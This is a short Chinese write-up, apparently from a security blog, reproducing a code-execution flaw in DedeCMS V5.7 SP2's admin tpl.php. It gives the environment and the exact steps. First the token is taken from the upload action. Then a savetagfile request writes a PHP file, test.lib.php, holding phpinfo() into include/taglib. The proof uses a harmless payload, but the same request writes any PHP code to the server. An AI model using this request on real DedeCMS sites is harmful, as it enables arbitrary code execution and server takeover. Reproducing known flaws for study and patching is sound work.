DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现

2018-09-28

环境

Windows + phptudy php5.3.29

程序

DedeCMS v 5.7 sp2

漏洞复现

登录后台后
访问/dede/tpl.php?action=upload 获取token值

然后访问
/dede/tpl.php?action=savetagfile&filename=test.lib.php&content=<?php phpinfo();?>&token=4742f06c5b9cad86dbf3120b2bd61736

文件就会生成到\include\taglib目录下 命名为test.lib.php
访问test.lib.php查看是否能访问
